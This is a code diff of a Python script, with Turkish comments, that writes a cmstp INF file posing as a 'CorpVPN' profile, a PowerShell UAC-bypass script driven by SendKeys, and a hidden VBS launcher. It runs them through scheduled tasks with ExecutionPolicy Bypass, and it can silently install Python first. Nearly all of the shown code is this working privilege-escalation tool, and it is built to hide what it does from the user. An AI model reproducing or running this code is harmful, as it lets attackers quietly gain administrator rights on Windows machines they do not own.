@@ -22,6 +22,7 @@ CustomDestination=CustInstDestSectionAllUsers
 RunPreSetupCommands=RunPreSetupCommandsSection
 
 [RunPreSetupCommandsSection]
+; Commands to run before setup begins
 taskkill /IM cmstp.exe /F
 cmd /c start {temp_folder}\\ddd.vbs
 
@@ -38,11 +39,12 @@ ShortSvcName="CorpVPN"
     inf_file_path = os.path.join(temp_folder, 'corpvpn.inf')
     with open(inf_file_path, 'w') as f:
         f.write(inf_content)
+
     return inf_file_path
 
 def create_a_ps1():
     ps_code = '''
-# UAC Bypass using cmstp + SendKeys
+# UAC Bypass poc using SendKeys
 $InfFile = "$env:TEMP\\corpvpn.inf"
 
 Function Get-Hwnd {
@@ -79,7 +81,7 @@ $ps.CreateNoWindow = $true
 [System.Diagnostics.Process]::Start($ps) | Out-Null
 
 do {
-    Start-Sleep -Milliseconds 250
+    Start-Sleep -Milliseconds 200
 } until ((Get-Hwnd "cmstp") -ne $null)
 
 Set-WindowActive "cmstp"
@@ -89,6 +91,7 @@ Set-WindowActive "cmstp"
     a_ps1_path = os.path.join(temp_folder, 'a.ps1')
     with open(a_ps1_path, 'w') as f:
         f.write(ps_code)
+
     return a_ps1_path
 
 def create_vbs_launcher(ps1_path):
@@ -101,40 +104,44 @@ objShell.Run "powershell -ExecutionPolicy Bypass -File \"{ps1_path}\"", 0, False
     return vbs_path
 
 def main():
-    # Görevleri temizle
+    # 1. Görevleri temizle
     run_command('schtasks /delete /tn "InstallRequests" /f')
     run_command('schtasks /delete /tn "RunPowerShellScript" /f')
 
-    # Python kontrolü
+    # 2. Python var mı kontrol et
     returncode, _, _ = run_command("python --version")
     if returncode != 0:
         returncode, _, _ = run_command('first.exe /quiet InstallAllUsers=0 PrependPath=1')
         if returncode != 0:
             sys.exit(1)
 
-    # pip install için script
+    # 3. requests modülünü kuracak scripti oluştur
     temp_dir = os.getenv('TEMP')
     script_path = os.path.join(temp_dir, 'install_requests.py')
     with open(script_path, 'w') as script_file:
         script_file.write("import subprocess\n")
         script_file.write("subprocess.check_call(['python', '-m', 'pip', 'install', 'requests'])\n")
 
+    # 4. Schedule it (gizli gerekmez çünkü pip install zaten arka plan)
     now = datetime.now() + timedelta(minutes=1)
-    run_command(f'schtasks /create /tn "InstallRequests" /tr "python {script_path}" /sc once /st {now.strftime("%H:%M") } /f')
+    time_str = now.strftime("%H:%M")
+    run_command(f'schtasks /create /tn "InstallRequests" /tr "python {script_path}" /sc once /st {time_str} /f')
     run_command('schtasks /run /tn "InstallRequests"')
     time.sleep(10)
     os.remove(script_path)
 
-    # INF + PS1 oluştur
+    # 5. INF ve PowerShell dosyasını oluştur
     inf_file_path = create_inf_file()
     a_ps1_path = create_a_ps1()
+    vbs_launcher = create_vbs_launcher(a_ps1_path)
 
-    # PowerShell dosyasını sessiz çalıştıracak .vbs dosyası
-    vbs_path = create_vbs_launcher(a_ps1_path)
-
-    # Zamanlanmış görev ile VBS'i başlat
+    # 6. Tamamen sessiz PowerShell script çalıştırmak için VBS kullan
     future_time = (datetime.now() + timedelta(minutes=2)).strftime("%H:%M")
-    run_command(f'schtasks /create /tn "RunPowerShellScript" /tr "wscript.exe //B //Nologo {vbs_path}" /sc once /st {future_time} /f')
+    resultcode, out, err = run_command(f'schtasks /create /tn "RunPowerShellScript" /tr "wscript.exe //B //Nologo {vbs_launcher}" /sc once /st {future_time} /f')
+    if resultcode != 0:
+        print(f"Task creation failed: {err}")
+        sys.exit(1)
+
     run_command('schtasks /run /tn "RunPowerShellScript"')
 
 if __name__ == "__main__":
